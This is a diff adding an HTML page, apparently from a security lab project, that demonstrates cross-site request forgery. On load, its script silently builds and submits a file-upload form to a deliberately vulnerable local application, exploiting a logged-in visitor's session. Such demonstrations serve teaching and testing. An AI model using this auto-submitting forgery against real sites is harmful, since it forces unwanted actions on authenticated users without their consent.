@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Upload Page</title>
+    <script>
+        function autoSubmit() {
+            const form = document.createElement('form');
+            form.action = "http://localhost/DeadXploit/vulnerable_website/upload.php";
+            form.method = "POST";
+            form.enctype = "multipart/form-data";
+
+            const input = document.createElement('input');
+            input.type = "file";
+            input.name = "file";
+            input.accept = ".txt";
+
+            const fileName = new Blob(["Malicious content here"], { type: "text/plain" });
+            const file = new File([fileName], "malicious_file.txt", { type: "text/plain" });
+            const dataTransfer = new DataTransfer();
+            dataTransfer.items.add(file);
+            input.files = dataTransfer.files;
+
+            form.appendChild(input);
+            document.body.appendChild(form);
+            form.submit();
+        }
+    </script>
+</head>
+<body onload="autoSubmit()">
+    <h1>You have been tricked!</h1>
+    <p>If you are logged into the vulnerable application, a file will be uploaded.</p>
+</body>
+</html>
